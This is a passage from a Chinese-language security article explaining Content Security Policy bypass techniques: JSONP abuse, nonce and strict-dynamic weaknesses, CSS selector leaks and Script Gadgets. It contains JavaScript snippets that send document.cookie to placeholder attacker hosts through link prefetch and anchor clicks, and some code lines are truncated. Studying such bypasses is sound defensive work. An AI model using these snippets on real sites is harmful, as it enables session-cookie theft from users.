##### 6
    header("Content-Security-Policy: default-src 'self'; script-src 'self' ");
或许你的站内并没有这种问题，但你可能会使用jsonp来跨域获取数据，现代很流行这种方式。
但jsonp本身就是CSP的克星，jsonp本身就是处理跨域问题的，所以它一定在可信域中。
    /* API response */
    alert(document.domain);//{"var": "data", ...});
这样你就可以构造任意js，即使你限制了callback只获取`\w+`的数据，部分js仍然可以执行，配合一些特殊的攻击手段和场景，仍然有危害发生。
唯一的办法是返回类型设置为json格式。
##### 7
    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ");
比起刚才的CSP规则来说，这才是最最普通的CSP规则。
unsafe-inline是处理内联脚本的策略，当CSP中制定script-src允许内联脚本的时候，页面中直接添加的脚本就可以被执行了。
既然我们可以任意执行js了，剩下的问题就是怎么绕过对可信域的限制。
###### 1 js生成link prefetch
第一种办法是通过js来生成link prefetch
    var n0t = document.createElement("link");
    n0t.setAttribute("rel", "prefetch");
    n0t.setAttribute("href", "//ssssss.com/?" + document.cookie);
    document.head.appendChild(n0t);
这种办法只有chrome可以用，但是意外的好用。
###### 2 跳转 跳转 跳转
在浏览器的机制上， 跳转本身就是跨域行为
通过跨域请求，我们可以把我们想要的各种信息传出
###### 3 跨域请求
在浏览器中，有很多种请求本身就是跨域请求，其中标志就是href。
    var a=document.createElement("a");
    a.href='http://xss.com/?cookie='+escape(document.cookie);
    a.click();
包括表单的提交，都是跨域请求
#### 0x04 CSP困境以及升级
在CSP正式被提出作为减轻XSS攻击的手段之后，几年内不断的爆出各种各样的问题。
2016年12月Google团队发布了关于CSP的调研文章《CSP is Dead, Long live CSP》
Google团队利用他们强大的搜索引擎库，分析了超过160w台主机的CSP部署方式，他们发现。
加载脚本最常列入白名单的有15个域，其中有14个不安全的站点，因此有75.81%的策略因为使用了了脚本白名单，允许了攻击者绕过了CSP。总而言之，我们发现尝试限制脚本执行的策略中有94.68%是无效的，并且99.34%具有CSP的主机制定的CSP策略对xss防御没有任何帮助。
在paper中，Google团队正式提出了两种以前被提出的CSP种类。
**1、nonce script CSP**
    header("Content-Security-Policy: default-src 'self'; script-src 'nonce-{random-str}' ");
动态的生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行。
这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，只要保证所加载的任何资源都是可信的就可以了。
    ">
**2、strict-dynamic**
    header("Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' ");
SD意味着可信js生成的js代码是可信的。
这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。
Google团队提出的这两种办法，希望通过这两种办法来适应各种因为前端发展而出现的CSP问题。
但攻与防的变迁永远是交替升级的。
**1、nonce script CSP Bypass**
2016年12月，在Google团队提出nonce script CSP可以作为新的CSP趋势之后，圣诞节Sebastian Lekies提出了nonce
CSP的致命缺陷。
**Nonce CSP对纯静态的dom xss简直没有防范能力**
Web2.0时代的到来让前后台交互的情况越来越多，为了应对这种情况，现代浏览器都有缓存机制，但页面中没有修改或者不需要再次请求后台的时候，浏览器就会从缓存中读取页面内容。
从 **location.hash** 就是一个典型的例子
如果JS中存在操作location.hash导致的xss，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。
这样的CSP Bypass方式我曾经出过ctf题目，详情可以看
除了最常见的location.hash，作者还提出了一个新的攻击方式，通过CSS选择器来读取页面内容。
    *[attribute^="a"]{background:url("record?match=a")} 
    *[attribute^="b"]{background:url("record?match=b")} 
    *[attribute^="c"]{background:url("record?match=c")} [...] 
当匹配到对应的属性，页面就会发出相应的请求。
页面只变化了CSS，纯静态的xss。
CSP无效。
**2、strict-dynamic Bypass**
2017年7月 Blackhat，Google团队提出了全新的攻击方式Script Gadgets。
    header("Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' ");
Strict-dynamic的提出正是为了适应现代框架 但Script Gadgets正是现代框架的特性
Script Gadgets 一种类似于短标签的东西，在现代的js框架中四处可见
    For example:
    Knockout.js
    Eval("foo")
    bypass
Script Gadgets本身就是动态生成的js，所以对新型的CSP几乎是破坏式的Bypass。
#### 0x05 写在最后
说了一大堆，黑名单配合CSP仍然是最靠谱的防御方式。
但，防御没有终点...
#### 0x06 ref
  * [1] 
  * [2] 
  * [3] 
  * [4] 
* * *